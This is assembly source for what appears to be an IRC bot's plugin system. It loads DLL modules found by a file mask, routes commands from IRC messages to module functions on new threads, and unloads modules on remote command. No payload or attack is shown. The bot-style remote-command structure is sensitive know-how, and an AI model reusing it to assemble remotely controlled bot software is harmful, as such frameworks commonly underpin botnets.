;-----------------------------------------------------------------------
.code
;-----------------------------------------------------------------------
handle_module   proc    _dwtype, lpszline, lpsmodules
    local   szbuffer1[1024]:byte

    mov     esi, lpsmodules
    .while  dword ptr (smodules ptr [esi]).handle
    
        .if     dword ptr (smodules ptr [esi]).handle != -1
    
            mov     ebx, (smodules ptr [esi]).lpmdt
            lea     ebx, (MODULE_DESCRYPTION_TABLE ptr [ebx]).scommands
            
            mov     eax, _dwtype
            .repeat
            
                .break  .if dword ptr (MODULE_COMMANDS ptr [ebx]).dwtype == eax
                add     ebx, sizeof MODULE_COMMANDS
            
            .until  !dword ptr (MODULE_COMMANDS ptr [ebx]).dwtype

            push    esi
            .if dword ptr (MODULE_COMMANDS ptr [ebx]).dwtype
                    
                switch  eax
                    case    _MODULE_TYPE_PRVMSG || eax == _MODULE_TYPE_DOTCOMMAND

                        invoke  get_token, addr szbuffer1, lpszline, ':', 2, FALSE
                        invoke  get_token, addr szbuffer1, addr szbuffer1, ' ', 0, FALSE

                    case    _MODULE_TYPE_IRC
                        invoke  get_token, addr szbuffer1, lpszline, ' ', 1, FALSE

                endsw

                invoke  szCmp, addr szbuffer1, addr (MODULE_COMMANDS ptr [ebx]).szcommand
                .if     eax
                    invoke  CreateThread, 0, 0, (MODULE_COMMANDS ptr [ebx]).dwfunction, lpszline, 0, addr szbuffer1

                .endif
            
            .endif
            pop     esi

        .endif
        
        add     esi, sizeof smodules
    .endw
    ret
handle_module   endp

;-----------------------------------------------------------------------
unload_module   proc    dwsocket, lpszreply, lpszarguments, lpbotinfo
    local   szbuffer1[1024]:byte, szbuffer2[1024]:byte, szbuffer3[1024]:byte
    
    invoke  get_token, addr szbuffer2, lpszarguments, ' ', 1, FALSE
    invoke  atodw, addr szbuffer2
    
    mov     ebx, lpbotinfo
    lea     ebx, (sbot_data ptr [ebx]).modules
    xor     ecx, ecx
    .while  dword ptr (smodules ptr [ebx]).handle
        
        .if     dword ptr (smodules ptr [ebx]).handle != -1
            inc     ecx
            .if     ecx == eax
            
                mov     esi, (smodules ptr [ebx]).lpmdt
                lea     esi, (MODULE_DESCRYPTION_TABLE ptr [esi]).szmodule
                invoke  xcopy, addr szbuffer3, esi, 64
                
                invoke  FreeLibrary, (smodules ptr [ebx]).handle

                mov     (smodules ptr [ebx]).handle, -1     ; module killed
                
                .break
            .endif
        .endif
        add     ebx, sizeof smodules
    .endw
    
    .if     dword ptr (smodules ptr [ebx]).handle == -1
        invoke  wsprintf, addr szbuffer1, SADD("Module killed: [%s] - %s"), addr szbuffer2, addr szbuffer3
        invoke  send_msg, dwsocket, lpszreply, addr szbuffer1
    .else
        invoke  wsprintf, addr szbuffer1, SADD("Module not found: [%s]"), addr szbuffer2
        invoke  send_msg, dwsocket, lpszreply, addr szbuffer1
    .endif
    
    ret
unload_module   endp

;-----------------------------------------------------------------------
module_load proc    lpbot_data, lpsmodules
    local   sfinddata :WIN32_FIND_DATA, hfind, dwcounter

    mov     ebx, lpsmodules
    mov     dwcounter, 0
    invoke  FindFirstFile, SADD(MODULE_SEARCH_MASK), addr sfinddata
    .if     eax != INVALID_HANDLE_VALUE
        mov     hfind, eax

        .repeat

            invoke  LoadLibrary, addr sfinddata.cFileName
            .if     eax
                mov     (smodules ptr [ebx]).handle, eax
                
                invoke  GetProcAddress, eax, SADD(MODULE_INIT)
                .if     eax
                    
                    push    lpbot_data
                    call    eax
                    
                    mov     (smodules ptr [ebx]).lpmdt, eax

                    add     ebx, sizeof smodules
                    
                .else
                    
                    invoke  FreeLibrary, (smodules ptr [ebx]).handle
                    
                .endif
            .endif

            invoke  FindNextFile, hfind, addr sfinddata
            .break  .if !eax
            
        .until dwcounter == MAX_MODULES
        
    .endif
    invoke  FindClose, hfind
    
    ret
module_load     endp

;-----------------------------------------------------------------------
module_unload   proc    lpsmodules
    mov     esi, lpsmodules
    .while  dword ptr (smodules ptr [esi]).handle
        
        .if dword ptr (smodules ptr [esi]).handle != -1       ; a killed module

            invoke  FreeLibrary, (smodules ptr [esi]).handle
            
            ; this actually isn't necessary since this function is called only to unload all modules and exit
            mov     (smodules ptr [esi]).handle, -1
            
        .endif
        add     esi, sizeof smodules
    .endw
    ret
module_unload   endp

;-----------------------------------------------------------------------
